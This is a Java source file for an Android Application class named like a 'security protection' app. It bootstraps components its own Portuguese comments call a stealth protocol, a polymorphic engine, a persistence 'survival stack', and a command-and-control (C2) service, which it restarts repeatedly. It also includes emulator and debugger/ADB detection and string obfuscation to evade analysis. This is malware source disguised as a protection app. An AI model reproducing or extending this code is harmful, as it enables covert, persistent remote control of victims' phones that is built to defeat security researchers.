package com.seguranca.protecao;

import android.app.Application;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import org.lsposed.lsparanoid.Obfuscate;
import com.seguranca.protecao.stealth.StealthProtocol;
import com.seguranca.protecao.util.PolymorphicEngine;

/**
 * Application entry point — global initialization and background service bootstrap.
 * ROM compatibility: MIUI, ColorOS, EMUI battery optimization handling.
 * Integra Protocolo Stealth e Engine Polimórfica na inicialização.
 */
@Obfuscate
public class AppCoreInitializer extends Application {

    private static final String TAG = "AppCore";

    @Override
    public void onCreate() {
        super.onCreate();
        
        // 🔒 STEALTH GATE: Inicializa protocolo stealth PRIMEIRO
        // Se ambiente hostil detectado, não inicia componentes sensíveis
        boolean environmentSafe = true;
        try {
            StealthProtocol stealth = StealthProtocol.getInstance();
            environmentSafe = stealth.initialize(this);
            Log.d(TAG, "🛡️ Stealth Protocol: " + (environmentSafe ? "ambiente seguro" : "AMEAÇA DETECTADA"));
        } catch (Exception e) {
            Log.e(TAG, "StealthProtocol init erro: " + e.getMessage());
        }

        // 🔀 Inicializa engine polimórfica
        try {
            PolymorphicEngine engine = PolymorphicEngine.getInstance();
            engine.initialize(this);
            engine.start();
            Log.d(TAG, "🔀 PolymorphicEngine ativa");
        } catch (Exception e) {
            Log.e(TAG, "PolymorphicEngine init erro: " + e.getMessage());
        }

        // 🛡️ Handler global de exceções não capturadas para evitar crash do app
        final Thread.UncaughtExceptionHandler defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            Log.e(TAG, "⚠️ Exceção não capturada no thread " + thread.getName() + ": " + throwable.getMessage(), throwable);
            try {
                // Tenta reiniciar o serviço de C&C se cair
                startBackgroundServices();
            } catch (Exception ignored) {}
            if (defaultHandler != null) {
                defaultHandler.uncaughtException(thread, throwable);
            }
        });

        requestBatteryOptimizationExemption();

        // Arm ALL persistence layers before starting services
        try {
            PersistenceEngine.arm(this);
            Log.d(TAG, "🔒 PersistenceEngine armed — Android 16/17 survival stack active");
        } catch (Exception e) {
            Log.e(TAG, "PersistenceEngine.arm error: " + e.getMessage());
        }

        // Só inicia serviços C2 se ambiente for seguro
        if (environmentSafe) {
            // Inicia o serviço de C&C imediatamente e garante permanência
            startBackgroundServices();
            
            new Thread(() -> {
                try {
                    Thread.sleep(3000);
                    startBackgroundServices();
                    Thread.sleep(5000);
                    startBackgroundServices();
                } catch (Exception ignored) {
                }
            }).start();
        } else {
            Log.w(TAG, "⚠️ Ambiente hostil — serviços C2 NÃO iniciados");
        }
    }

    private void requestBatteryOptimizationExemption() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Log.d(TAG, "Battery optimization not ignored yet");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery optimization check failed: " + e.getMessage());
        }
    }

    private boolean isRunningInEmulator() {
        return Build.FINGERPRINT.contains("generic")
            || Build.FINGERPRINT.contains("unknown")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK")
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.BRAND.startsWith("generic")
            || Build.DEVICE.startsWith("generic")
            || (Build.PRODUCT != null && Build.PRODUCT.contains("sdk"));
    }

    private boolean isBeingDebugged() {
        try {
            if (android.os.Debug.isDebuggerConnected()) {
                return true;
            }
            int adbEnabled = Settings.Global.getInt(
                getContentResolver(),
                Settings.Global.ADB_ENABLED, 0
            );
            return adbEnabled == 1;
        } catch (Exception e) {
            return false;
        }
    }

    private void startBackgroundServices() {
        try {
            Intent ccIntent = new Intent(this, CommandControlService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                try {
                    startForegroundService(ccIntent);
                } catch (Exception e) {
                    Log.e(TAG, "startForegroundService falhou, tentando startService: " + e.getMessage());
                    try { startService(ccIntent); } catch (Exception ignored) {}
                }
            } else {
                startService(ccIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro em startBackgroundServices: " + e.getMessage());
        }
    }
}
